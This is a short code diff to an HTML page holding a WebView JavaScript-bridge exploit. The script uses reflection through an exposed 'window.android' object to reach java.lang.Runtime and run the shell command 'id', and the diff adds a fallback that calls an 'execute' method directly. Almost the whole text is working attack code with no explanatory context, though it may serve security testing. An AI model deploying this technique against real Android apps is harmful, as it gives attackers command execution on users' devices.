@@ -5,13 +5,15 @@
 <body>
 <script>
 try {
-    var runtime = window.android.getClass().forName('java.lang.Runtime');
-    var process = runtime.getMethod('getRuntime').invoke(null);
-    var exec = runtime.getMethod('exec', 'java.lang.String');
-    var result = exec.invoke(process, 'id');
-    document.write('Executed');
+    var result = window.android.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id');
+    document.write('Executed: ' + result);
 } catch (e) {
-    document.write('Error: ' + e);
+    try {
+        var cmd = window.android.execute('id');
+        document.write('Executed2: ' + cmd);
+    } catch (e2) {
+        document.write('Error: ' + e2);
+    }
 }
 </script>
 </body>
